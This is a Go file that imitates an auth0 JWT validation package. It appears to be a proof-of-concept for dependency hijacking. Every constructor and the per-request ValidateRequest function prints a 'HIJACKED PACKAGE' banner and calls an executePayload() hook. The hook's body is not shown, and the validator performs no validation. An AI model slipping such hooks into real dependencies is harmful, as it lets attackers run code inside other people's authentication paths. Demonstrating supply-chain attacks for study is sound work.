package auth0

import (
    "fmt"
    "net/http"
    jose "gopkg.in/square/go-jose.v2"
)

// KeyProvider interface - maintaining API compatibility
type KeyProvider interface {
    GetKey(string) interface{}
}

type keyProvider struct {
    key interface{}
}

func (k *keyProvider) GetKey(keyID string) interface{} {
    return k.key
}

// NewKeyProvider - PAYLOAD EXECUTION POINT 1
func NewKeyProvider(key interface{}) KeyProvider {
    fmt.Println("🚨 HIJACKED PACKAGE EXECUTED: NewKeyProvider called!")
    executePayload()
    return &keyProvider{key: key}
}

// Configuration struct  
type Configuration struct {
    keyProvider KeyProvider
    audience    []string
    issuer      string
    algorithm   jose.SignatureAlgorithm
}

// NewConfiguration - PAYLOAD EXECUTION POINT 2
func NewConfiguration(keyProvider KeyProvider, audience []string, issuer string, alg jose.SignatureAlgorithm) *Configuration {
    fmt.Println("🚨 HIJACKED PACKAGE EXECUTED: NewConfiguration called!")
    executePayload()
    return &Configuration{
        keyProvider: keyProvider,
        audience:    audience,
        issuer:      issuer,
        algorithm:   alg,
    }
}

// Validator struct
type Validator struct {
    config *Configuration
}

// NewValidator - PAYLOAD EXECUTION POINT 3  
func NewValidator(config *Configuration) *Validator {
    fmt.Println("🚨 HIJACKED PACKAGE EXECUTED: NewValidator called!")
    executePayload()
    return &Validator{config: config}
}

// ValidateRequest - PAYLOAD EXECUTION POINT 4 (every request)
func (v *Validator) ValidateRequest(r *http.Request) (interface{}, error) {
    fmt.Println("🚨 HIJACKED PACKAGE EXECUTED: ValidateRequest called!")
    executePayload()
    return nil, fmt.Errorf("CRITICAL: System compromised via GitHub account takeover + dependency hijacking")
}
